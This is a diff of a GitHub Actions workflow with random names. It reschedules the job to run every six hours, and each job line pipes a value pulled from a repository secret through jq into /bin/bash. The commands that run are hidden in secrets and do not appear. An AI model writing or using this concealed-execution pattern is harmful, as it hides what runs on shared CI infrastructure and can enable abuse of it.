@@ -3,7 +3,7 @@ name: fanweiti3817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 0/6 * * *'
+    - cron: '21 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: fanweiti3817
         env:
-          uwr3: ${{ secrets.uwr3 }}
+          gzlsk1: ${{ secrets.gzlsk1 }}
         run: |
-          echo $uwr3 | jq -r .ldvo18 | /bin/bash
-          echo $ucz99 | jq -r .khnrm66338 | /bin/bash
-          echo $hr75 | jq -r .bfvm527 | /bin/bash
-          echo $c68 | jq -r .pn5 | /bin/bash
-          echo $d8907 | jq -r .bt6744 | /bin/bash
-          echo $fw49 | jq -r .s86 | /bin/bash
-          echo $cv7457 | jq -r .hsdyd9525 | /bin/bash
-          echo $iak5311 | jq -r .en45605 | /bin/bash
-          echo $wkae9 | jq -r .membw46 | /bin/bash
-          echo $peqdu986 | jq -r .yout4 | /bin/bash
-          echo $squ36 | jq -r .jdb952 | /bin/bash
-          echo $xbivp62194 | jq -r .nkdmw8 | /bin/bash
+          echo $gzlsk1 | jq -r .kr5 | /bin/bash
+          echo $kn764 | jq -r .hvi390 | /bin/bash
+          echo $mh0 | jq -r .hvvj90684 | /bin/bash
+          echo $llbwu037 | jq -r .thoaa60373 | /bin/bash
+          echo $hfhl0 | jq -r .e38 | /bin/bash
+          echo $x37798 | jq -r .olnep73 | /bin/bash
+          echo $y53192 | jq -r .mwp6439 | /bin/bash
+          echo $gwy3 | jq -r .trxa24463 | /bin/bash
+          echo $pf7847 | jq -r .afbj98 | /bin/bash
 
